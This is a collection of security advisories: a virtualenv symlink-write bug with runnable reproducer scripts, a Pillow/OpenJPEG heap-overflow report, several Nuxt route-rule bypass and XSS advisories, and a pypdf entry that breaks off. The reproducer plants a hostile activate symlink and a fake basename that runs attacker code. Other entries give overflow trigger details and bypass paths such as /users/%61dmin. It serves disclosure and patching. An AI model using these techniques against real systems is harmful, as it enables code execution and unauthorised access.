## Reproducer files

The following files are from the scanner report for `ANT-2026-XBEOCBS1`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
import tempfile

# set up: a fresh home with Debian's stock ~/.bashrc, which sources ~/.bash_aliases when that file exists
home = tempfile.mkdtemp(prefix="home-")
shutil.copy("/etc/skel/.bashrc", f"{home}/.bashrc")
bash_aliases = f"{home}/.bash_aliases"
marker = f"{home}/attacker-ran"
open_terminal = ["bash", "-i", "-c", "true"]
terminal_env = {"HOME": home, "PATH": "/usr/bin:/bin", "TERM": "dumb"}

# the attacker's repository, cloned by the user to ~/proj
checkout = f"{home}/proj"
subprocess.run([sys.executable, "/tmp/repro.d/make_hostile_checkout.py", checkout], check=True)
activate = f"{checkout}/venv/bin/activate"
print("shipped: venv/bin/activate ->", os.readlink(activate), flush=True)

# a terminal opened before virtualenv runs does not touch the checkout (stderr: bash -i without a tty warns)
subprocess.run(open_terminal, env=terminal_env, stderr=subprocess.DEVNULL, check=True)
print("before virtualenv: ~/.bash_aliases exists:", os.path.lexists(bash_aliases), "| marker exists:", os.path.exists(marker), flush=True)
assert not os.path.lexists(bash_aliases) and not os.path.exists(marker)

# trigger: the user creates an environment in the checkout, then opens a new terminal
subprocess.run(["virtualenv", "--no-periodic-update", "venv"], cwd=checkout, env={**os.environ, "HOME": home}, check=True)
subprocess.run(open_terminal, env=terminal_env, stderr=subprocess.DEVNULL, check=True)

# check: the activation script belongs in venv/bin/activate; it must not be written through the link to ~/.bash_aliases
print("venv/bin/activate is still the symlink:", os.path.islink(activate))
written_outside = os.path.isfile(bash_aliases) and not os.path.islink(bash_aliases)
print("~/.bash_aliases created as a regular file:", written_outside)
if written_outside:
    print("  its first line:", open(bash_aliases).readline().rstrip())
attacker_code_ran = os.path.exists(marker)
print("after a new terminal, marker exists:", attacker_code_ran)
if attacker_code_ran:
    print("  it says:", open(marker).read().rstrip())
print("BUG" if written_outside and attacker_code_ran else "OK")
```

**`repro.d/fake_basename.sh`**

```text
#!/bin/sh
echo "attacker code ran as $(id -un)" > "$HOME/attacker-ran"
exec /usr/bin/basename "$@"
```

**`repro.d/make_hostile_checkout.py`**

```text
import os
import shutil
import sys

checkout = sys.argv[1]
bin_dir = os.path.join(checkout, "venv", "bin")
os.makedirs(bin_dir)

# venv/bin/../../.. is the directory holding the checkout, i.e. ~ for a clone at ~/proj; ~/.bash_aliases does not exist
os.symlink("../../../.bash_aliases", os.path.join(bin_dir, "activate"))

# the bash activation script runs $(basename "$VIRTUAL_ENV") right after putting venv/bin first on PATH
fake_basename = os.path.join(bin_dir, "basename")
shutil.copy(os.path.join(os.path.dirname(__file__), "fake_basename.sh"), fake_basename)
os.chmod(fake_basename, 0o755)
```

## Impact

Creation can overwrite or create files outside the requested environment with the invoking user's permissions. File
contents are constrained by what virtualenv generates.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix replaces existing entries, including symbolic and hard links, and exclusively creates generated text
files. Before stdlib creation it replaces executable-directory symlinks and Windows junctions with real directories. It
then removes symbolic and hard links inside that directory, including interpreter executables and DLLs, and at the
configuration and ignore file paths. This also removes unrelated links directly in the executable directory. Final
seed-launcher links are replaced. Exclusive creation protects the final text-file open; delegated stdlib and distlib
writes still require a destination protected from concurrent replacement.

Fix: [PR #3431](https://github.com/pypa/virtualenv/pull/3431).

## Known mitigation

Use a fresh destination beneath an owner-controlled parent. Avoid creation over a tree populated by another account.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-XBEOCBS1.

summary: Pillow: Bundled libopenjp2 2.5.4 in all wheels since 11.1.0 carries OSV-2025-219 heap-buffer-overflow write reachable from Image.open().load()
description:
### Summary

Every Pillow wheel from 11.1.0 onward bundles a libopenjp2 containing a heap-buffer-overflow **write** that is fixed upstream on master but has never appeared in an OpenJPEG release. See https://osv.dev/vulnerability/OSV-2025-219

Because the wheel bundles its own copy, a patched host OS does not help. It is reachable from `Image.open(fp); im.load()` with default settings.

I am reporting it here rather than only upstream because Pillow is where the vulnerable binary actually reaches users.

Note the inversion that makes this easy to miss: **OpenJPEG 2.5.2 and earlier are safe.** The bug was introduced in `954c6e3c` (2024-06-25), so keeping the dependency current is what creates the exposure.

### Details

## Affected wheels

From `.github/dependencies.json` (`openjpeg`) at each tag:

| Pillow | bundled OpenJPEG | status |
|---|---|---|
| 10.4.0 | 2.5.2 | safe |
| 11.0.0 | 2.5.2 | safe |
| **11.1.0, 11.2.1, 11.3.0** | **2.5.3** | **affected** |
| **12.0.0 … 12.3.0** | **2.5.4** | **affected** |

Confirmed on an installed wheel: `PIL.features.version_codec('jpg_2000')` → `2.5.4`, bundled file `pillow.libs/libopenjp2-*.so.2.5.4`. `main` still pins `2.5.4` as of 2026-10-06.

## The defect

`src/lib/openjp2/j2k.c`, in `opj_j2k_read_sod`:

```c
OPJ_UINT32 l_current_tile_part =
    l_cstr_index->tile_index[p_j2k->m_current_tile_number].current_tpsno;
l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_header = l_current_pos;
l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_pos   =
    l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2;
```

`tp_index` is neither null-checked nor bounds-checked, and `l_current_tile_part` comes directly from the one-byte `TPsot` field of the SOT marker.

The correct guard already exists a few lines later in `opj_j2k_add_tlmarker` (j2k.c:8459), writing the **same array at the same index** behind `if (tp_index && l_current_tile_part < nb_tps)`. One writer checked, its sibling not.

Reached by giving the codestream a *valid* TLM marker — so `tp_index` is allocated once by `opj_j2k_build_tp_index_from_tlm`, sized to the TLM entry count, and `opj_j2k_read_sot` then skips all resizing — while setting `TNsot = 0` in every SOT, which keeps the TLM "valid" and lets `TPsot` walk past the allocation.

## Patch status

Fixed upstream in `91d08b11` ("Fix heap buffer overlfow in opj_j2k_read_sod", 2026-02-10).

The newest OpenJPEG tag is **v2.5.4 (2025-09-20)**, and `compare/v2.5.4...91d08b11` reports *ahead 6, behind 0* — the fix is **in no release, 8 months on**.

## Suggested remediation

1. Carry `91d08b11` as a patch in the wheel build until an OpenJPEG release includes it — three lines, identical to a guard already present in the same file.
2. Consider asking OpenJPEG to cut a release; they have had an unreleased memory-corruption fix on master since February 2026, and every distro is shipping the vulnerable code.
3. Your security handbook already tells applications to block EPS at the application layer. A similarly explicit note that `Image.open()` ignores filename/Content-Type and will reach any compiled-in codec unless `formats=` is passed would help downstream apps a lot.

## Not a Pillow bug, but relevant: the extension allowlist most apps rely on does not apply

`Image.open()` sniffs magic bytes, so a JPEG 2000 codestream in a file named `avatar.png` declared `Content-Type: image/png` reaches the JP2 decoder anyway.

I verified this against a production service documenting PNG/JPEG-only uploads: it accepted and fully decoded a JP2 through exactly that path, with 16 formats reachable from one upload endpoint against 43 registered openers. That service has since fixed it by passing `formats=` and validating on the detected format rather than the client's `Content-Type`.

That is the reason a decoder-level issue like this one has much wider reach than downstream maintainers tend to assume.

### Proof of concept

ASan build of OpenJPEG 2.5.4 interposed under a **stock Pillow 12.3.0**, running `Image.open(p); im.load()`:

```
==766332==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8
    #0 opj_j2k_read_sod          j2k.c:5086
    #1 opj_j2k_read_tile_header  j2k.c:9912
    #2 opj_read_tile_header      openjpeg.c:575
    #3 j2k_decode_entry          src/libImaging/Jpeg2KDecode.c:793
    #4 ImagingJpeg2KDecode       src/libImaging/Jpeg2KDecode.c:949
    #5 _decode                   src/decode.c:132
located 8 bytes to the right of a 24-byte region allocated by
    opj_j2k_build_tp_index_from_tlm j2k.c:8939
```

Frames 3–5 are Pillow's own decoder, not a synthetic harness. No non-default decoder options are involved; strict mode is on, which is Pillow's behaviour since Pillow never calls `opj_decoder_set_strict_mode`. A benign twin image runs the same path cleanly and returns a valid image, so this is the payload and not a parse failure.

I have deliberately **not** attached the PoC file to this initial report. I'm happy to attach the PoC, the builder script and the RIP-control harness here on request, or hold everything until a fix is ready.

No disclosure deadline from me; I will not publish anything while this is being worked on.

### Impact

Any application that calls `Image.open()` / `im.load()` on an image it did not produce — the overwhelmingly common case for upload handlers, thumbnailers and preview pipelines — can be made to perform an out-of-bounds heap write by supplying one crafted file.

**Floor, already certain.** On a stock non-sanitised wheel the overflow performs 245 writes walking to +5856 bytes past a 24-byte allocation, and glibc's own heap-metadata checker aborts the process (`corrupted size vs. prev_size`, `corrupted double-linked list`, SIGABRT). One file reliably kills a long-lived worker.

**Ceiling, demonstrated as a primitive but not as a finished exploit.** With same-size-class objects alive on both sides — an ordinary busy heap — the walk crosses `opj_event_mgr_t`, which holds three `opj_msg_callback` function pointers, and `opj_event_msg` then calls one (event.c:136):

```
rip  0x4000    <- value chosen by the attacker's file layout
rsi  0x3ff2    <- m_error_data, written by the same walk
```

Shifting the codestream with a COM marker moves `rip` with it (`0x16ce` → `0x4000`), so the instruction pointer is attacker-**chosen** rather than incidentally invalid. A benign control image leaves the same groomed heap untouched.

To be explicit about what I did not do: I have **not** built a working exploit. That additionally needs remote heap grooming and an ASLR defeat, and I attempted neither. I am reporting a controlled control-flow primitive, not a finished chain. The CVSS AC:H reflects that.

summary: Nuxt: Server-side route rules (`redirect`, `headers`, `proxy`, `ssr`) are skipped for case-variant paths when routing is case-insensitive
description:
## Impact

With the default `router.options.sensitive: false`, Nuxt's page router resolves routes case-insensitively, so `/Admin` renders the same page as `/admin`. On the server, however, route rules were resolved with Nitro's route-rule matcher, which matches keys case-sensitively. A request whose path differs from a rule key only in letter case therefore rendered the page with none of that rule applied.

Earlier fixes ([GHSA-mm7m-92g8-7m47](https://github.com/nuxt/nuxt/security/advisories/GHSA-mm7m-92g8-7m47), [GHSA-hxvh-4h3w-prp9](https://github.com/nuxt/nuxt/security/advisories/GHSA-hxvh-4h3w-prp9)) case-folded the route rules that the Nuxt app itself reads, such as `appMiddleware`. This advisory covers the rules applied on the server:

- `redirect`: a rule used to send visitors away from a page, such as `'/admin/**': { redirect: '/login' }`, was skipped, and the page and its server-fetched data were rendered instead.
- `headers`: per-route response headers, including security headers such as `Content-Security-Policy` or `X-Frame-Options`, were not sent.
- `proxy`: the request was not proxied.
- `ssr: false` and `noScripts`: the page was server-rendered, or shipped scripts, despite the rule.
- `getRouteRules(event)` (auto-imported, or from `nuxt/server`) and `matchRouteRules` from `nuxt/server` returned no rules for the case variant.

```ts
export default defineNuxtConfig({
  routeRules: {
    '/admin/**': { redirect: '/login' },
  },
})
```

With this configuration, `/admin/secret` redirects to `/login`, but `/Admin/secret` rendered `app/pages/admin/secret.vue`.

## Mitigating factors

- Applications that set `router.options.sensitive: true` in `nuxt.config` are not affected, because their pages are only served for the exact case of the route.
- Access checks performed in server middleware, route middleware attached with `definePageMeta`, or in the page's data fetching are not affected. The issue only affects protections that rely on a server-side route rule matching the request path.

## Affected versions

`nuxt` `<4.6.2`, including all Nuxt 3 releases, and `@nuxt/nitro-server` `<4.6.2`.

## Patches

Fixed in `nuxt@4.6.2`. Nuxt 3 reached end of life on 31 July 2026 and will not receive a fix.

Nuxt now resolves server-side route rules itself, decoding and case-folding both the rule keys and the request path unless `router.options.sensitive` is set, and applies the result to Nitro's `redirect`, `headers` and `proxy` handling, the renderer, and the `getRouteRules` / `matchRouteRules` helpers.

When routing is case-insensitive, patched releases change some behaviour:

- Route rules also apply to case variants of server API routes. For example, `/API/x` now matches a `/api/**` `proxy` or `headers` rule.
- Rule keys that differ only in letter case now resolve to the same path on the server, and the later key takes precedence.

The following are not changed by this fix:

- `cache` and `swr` response caching is attached to server routes by Nitro's router, which matches case-sensitively. A case variant is still rendered with its route rules applied, but its response is not cached.
- Rules that a deployment preset compiles into platform configuration (for example Vercel's `config.json` or Netlify's `_redirects` and `_headers`) are matched by the platform. Once a request reaches the Nuxt server, the rules are applied as described above.
- If `sensitive` is set only in `app/router.options.ts`, the server follows the `nuxt.config` value. In that configuration route rules can only apply to more paths, never fewer.

## Workarounds

Upgrade to `nuxt@4.6.2`. If you cannot upgrade, including on Nuxt 3:

1. Set `router: { options: { sensitive: true } }` in `nuxt.config`, so pages are only served for the exact case of their route.
2. Alternatively, enforce access control in server middleware or route middleware rather than relying on a `redirect` route rule, and set security headers for every response rather than per route.

summary: Nuxt server islands render `useHeadSafe` input without sanitisation
description:
## Impact

`useHeadSafe` restricts head input to an allowlist of safe tags and attributes. For example, `bodyAttrs` is limited to `class` and `style`, event handler attributes are removed, and `<script>` tags are only kept for JSON types.

When `useHeadSafe` is called inside a server island (a `.server.vue` component or page, or a component rendered with `<NuxtIsland>`), the island renderer serialises the raw input of every head entry into the island response without the option that marks it as safe input. `<NuxtIsland>` then pushes that input into the page's head as a regular entry, both during server rendering and when hydrating or refetching on the client.

As a result, input that `useHeadSafe` would normally strip (such as `bodyAttrs.onload` or executable `<script>` content) is rendered into the page. If an application passes user-controlled data to `useHeadSafe` inside a server island, an attacker who controls that data can achieve stored cross-site scripting on the application's origin.

```vue
<!-- components/AuthorMeta.server.vue -->
<script setup lang="ts">
const { data: author } = await useFetch('/api/author')
// author.value.head is user-authored, e.g. { bodyAttrs: { onload: '...' } }
useHeadSafe(author.value.head)
</script>
```

## Mitigating factors

- Server components are experimental. They are only active when the application defines a `.server.vue` component or page, or enables `experimental.componentIslands` and renders `<NuxtIsland>`.
- Exploitation requires the application to pass attacker-controlled data to `useHeadSafe` inside a server island. `useHeadSafe` called from regular (non-island) components and pages is not affected.

## Affected versions

`nuxt` `>=3.13.0`, when head support for server islands was introduced. Nuxt 2 is not affected.

## Patches

Fixed in `nuxt@4.6.2`. Nuxt 3 reached end of life on 31 July 2026 and will not receive a fix.

Patched releases apply Unhead's safe input filtering to `useHeadSafe` entries on the server before they are added to the island response, so `islandResponse.head` (including what `render:island` hooks see) only contains input that `useHeadSafe` allows.

## Workarounds

Upgrade to `nuxt@4.6.2`. If you cannot upgrade, including on Nuxt 3:

1. Call `useHeadSafe` with untrusted input from a regular component or page rather than from inside a server island.
2. Alternatively, validate untrusted head input against your own allowlist before passing it to `useHeadSafe` inside a server island.

summary: Nuxt: Incomplete fix for GHSA-934w-87qh-qr26: a `javascript:` URL prefixed with an ASCII control character executes from `<NuxtLink>` when `pages` is disabled
description:
## Impact

An application that renders `<NuxtLink :to="...">` with a value it does not control can be made to render an anchor whose `href` executes script in the application's origin when clicked.

This is an incomplete fix for [GHSA-934w-87qh-qr26](https://github.com/nuxt/nuxt/security/advisories/GHSA-934w-87qh-qr26) (CVE-2026-53722). It only affects applications running without a `pages/` directory, where `pages` resolves to `false` and Nuxt registers its own router in place of vue-router. Applications using vue-router are not affected.

Prefixing `javascript:` with an ASCII C0 control character, for example `%01`, meant the value was not recognised as having a protocol. It was classified as an internal route and so never reached the protocol check added in GHSA-934w-87qh-qr26, and the router used for `pages: false` passed it through to the rendered `href` unchanged. Browsers strip the leading control character and run the result as a script URL.

Both `<NuxtLink custom>` and the default anchor are affected, and the `href` is present in the server-rendered HTML.

## Mitigating factors

- The application must have `pages` disabled (no `pages/` directory, or `pages: false`).
- The application must bind untrusted input to `:to`.
- A victim must click the rendered link.

## Affected versions

`nuxt` `<4.6.0`, including all Nuxt 3 releases. Versions before `4.4.7` and `3.21.7` are also affected by GHSA-934w-87qh-qr26.

## Patches

Fixed in `nuxt@4.6.0`. Nuxt 3 reached end of life on 31 July 2026 and will not receive a fix.

Anchor `href` values are now checked for script-capable protocols wherever they are rendered, including the router used when `pages` is disabled. Protocol detection also moved to the platform `URL` parser, so a URL is classified the same way the browser will read it.

## Workarounds

Upgrade to `nuxt@4.6.0` or later. If you cannot upgrade, including on Nuxt 3, validate values before binding them to `:to`, for example by rejecting anything that is not a path beginning with a single `/`.

summary: Nuxt: Route rules are matched against the raw request path, so a percent-encoded segment can bypass `appMiddleware` on dynamic and catch-all routes
description:
### Summary

Nuxt compared `routeRules` keys against the raw request path, without decoding percent-encoding, while the router decodes parameters when it resolves a route. A request whose path is percent-encoded can therefore resolve to a page while failing to match the route rule meant to protect it, so the rule's `appMiddleware` never runs, including during server rendering.

### Impact

For a page served through a dynamic or catch-all route, an attacker can percent-encode a character in the path to skip the rule:

```ts
export default defineNuxtConfig({
  routeRules: {
    '/users/admin': { appMiddleware: 'auth' },
  },
})
```

Requesting `/users/%61dmin` still renders `app/pages/users/[id].vue` with `id` decoded to `admin`, but the rule keyed `/users/admin` does not match, so `auth` does not run and the server renders and returns the gated page to an unauthenticated visitor. No privileges and no user interaction are required, and only ASCII characters are involved.

Purely static ASCII routes are not affected: static segments are matched without decoding, so a request for `/%61dmin` does not resolve to the page registered at `/admin` and 404s instead of rendering.

The rule keys affected are the ones carried in the app manifest and consumed by the app: `appMiddleware`, `redirect`, `appLayout`, `ssr`, `prerender`, and the payload flags derived from `cache`, `isr` and `swr`.

If you have pinned or overridden dependency versions below what your Nuxt release declares, a release outside the affected ranges can still be exposed, so do not conclude from a single reproduction that you are unaffected.

### Patches

Releases from `4.4.4` and `3.21.4` are not affected, because their dependency floor requires a version of the underlying HTTP layer that normalises percent-encoding in the request path before routing, which removes the mismatch in a default install.

The comparison itself is fixed in `nuxt@4.5.2` and `nuxt@3.21.11`: route-rule keys and lookup paths are now decoded (and, unless `router.options.sensitive` is set, case-folded) before they are compared. Reserved escapes such as `%2F` are left encoded, so decoding cannot introduce extra path segments, and paths that cannot be decoded are matched verbatim. Upgrading to those releases is recommended, since it fixes the comparison rather than relying on a dependency to normalise the input, and it also restores route rules for pages whose paths contain non-ASCII characters.

### Workarounds

If you cannot upgrade, do not rely on a `routeRules` key alone to protect a route. Attach the middleware to the page itself, which binds it to the resolved route rather than to the raw path string:

```vue
<script setup lang="ts">
definePageMeta({ middleware: 'auth' })
</script>
```

### Credits

Thanks to @sushi-gif, whose report that route rules keyed with non-ASCII paths never match the routes generated for those pages prompted the review that found this issue.

summary: pypdf: Possible long runtimes/large memory usage when retrieving form fields
description:
### Impact
